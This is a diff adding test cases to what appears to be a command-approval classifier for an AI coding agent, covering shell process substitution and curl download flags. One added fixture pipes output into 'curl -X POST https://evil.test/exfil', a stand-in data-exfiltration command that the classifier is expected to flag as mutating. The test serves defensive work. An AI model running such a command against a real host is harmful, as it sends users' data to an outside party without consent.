@@ -37,6 +37,27 @@ describe("OpenCode approval classifier", () => {
       expected: "unknown",
     },
     {
+      name: "output process substitution without proven mutation",
+      patterns: ["echo data > >(cat)", "cat"],
+      command: "echo data > >(cat)",
+      expected: "unknown",
+    },
+    {
+      name: "combined output process substitution without proven mutation",
+      patterns: ["echo data &> >(cat)", "cat"],
+      command: "echo data &> >(cat)",
+      expected: "unknown",
+    },
+    {
+      name: "output process substitution with a mutating child",
+      patterns: [
+        "echo data > >(curl -X POST https://evil.test/exfil)",
+        "curl -X POST https://evil.test/exfil",
+      ],
+      command: "echo data > >(curl -X POST https://evil.test/exfil)",
+      expected: "mutating",
+    },
+    {
       name: "output redirection",
       patterns: ["printf '%s' data > output.txt"],
       command: "printf '%s' data > output.txt",
@@ -173,6 +194,9 @@ describe("OpenCode approval classifier", () => {
     "curl -X GET -o output.txt",
     "curl -sO https://example.test/file",
     "curl -sXPOST https://example.test",
+    "curl -LO https://example.test/file",
+    "curl -qO https://example.test/file",
+    "curl -fsSLo output.txt https://example.test/file",
     "git log --all --output=log.txt",
     "sort --compress-program=gzip -o out.txt",
   ])("finds a write option after an earlier non-mutating option: %s", (command) => {
